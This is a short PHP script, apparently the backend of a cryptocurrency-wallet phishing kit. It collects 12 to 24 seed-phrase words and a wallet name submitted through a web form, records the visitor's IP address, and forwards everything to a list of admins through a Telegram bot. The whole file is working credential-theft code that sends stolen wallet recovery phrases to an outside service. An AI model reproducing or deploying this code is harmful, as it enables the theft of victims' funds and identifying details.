<?php
require_once './util/Util.php';
require_once './sender/TelegramSender.php';


$role = !empty($_POST['role']) ? $_POST['role'] : '0';
$role = intval($role);

$end = 12;
if ($role == 0)
    $end = 12;
else if ($role == 1)
    $end = 15;
else if ($role == 2)
    $end = 18;
else if ($role == 3)
    $end = 24;

/**
 * Get all 12 or 24 word
 */
$words = [];
for ($i = 1; $i <= $end; $i++)
    $words[] = !empty($_POST["w$i"]) ? $_POST["w$i"] : "null";


//IP
$ip = getUserIP();


//send
foreach (ADMINS as $admin) {

    $sender = new TelegramSender($admin, TELEGRAM_BOT_ID);
    $sender->sendWords("<Wallet:$_POST[wallet]>" . PHP_EOL . PHP_EOL . w($words) . PHP_EOL . PHP_EOL . "</Wallet:$_POST[wallet]>" . PHP_EOL . PHP_EOL . "IP: $ip"

        , $words);
}


echo json_encode(['status' => true, 'wallet' => "$_POST[wallet]", 'message' => json_encode($words)]);


function getUserIP(): string
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
        return $_SERVER['HTTP_CLIENT_IP'];
    else if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else
        return $_SERVER['REMOTE_ADDR'];

}

function w(array $words): string
{
    $res = "";

    foreach ($words as $word)
        $res .= "$word ";

    return $res;
}






